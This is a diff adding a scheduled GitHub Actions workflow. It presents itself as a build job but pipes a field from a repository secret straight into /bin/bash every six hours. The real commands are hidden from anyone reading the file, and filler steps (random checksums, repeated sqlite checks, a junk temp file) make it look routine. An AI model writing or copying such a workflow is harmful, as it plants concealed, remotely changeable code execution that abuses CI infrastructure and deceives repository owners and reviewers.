@@ -1,0 +1,22 @@
+name: chenliehui7815
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenliehui7815
+        env:
+          x28800: ${{ secrets.x28800 }}
+        run: |
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
+          echo "Build $(date +%s)"
+          echo $x28800 | jq -r .h22460 | /bin/bash
+          which brew
+          echo "xyz" > tmp.txt.tmp.tmp.txt
+          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
+          which apt-get
